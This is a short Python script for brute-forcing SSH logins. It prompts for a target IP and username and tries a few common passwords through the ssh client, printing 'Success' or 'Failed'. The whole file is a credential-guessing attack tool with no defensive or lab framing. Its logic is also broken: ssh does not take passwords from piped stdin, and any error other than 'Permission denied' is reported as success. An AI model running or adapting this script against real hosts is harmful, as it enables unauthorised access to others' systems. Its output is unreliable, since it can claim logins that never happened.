import subprocess

def brute_ssh(host, username, password_list):
    for password in password_list:
        try:
            result = subprocess.run(
                ['ssh', f'{username}@{host}', f'echo {password}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                input=password + '\n', 
                timeout=5  
            )
            
            if 'Permission denied' in result.stderr:
                print(f"Failed: {username}@{host} with password: {password}")
            else:
                print(f"Success: {username}@{host} with password: {password}")
                break

        except subprocess.TimeoutExpired:
            print(f"Timeout occurred for {username}@{host} with password: {password}")
        except Exception as e:
            print(f"Error: {e}")

host = input("Enter target IP: ")
username = input("Enter username: ")
password_list = ["123456", "admin", "password"]

brute_ssh(host, username, password_list)
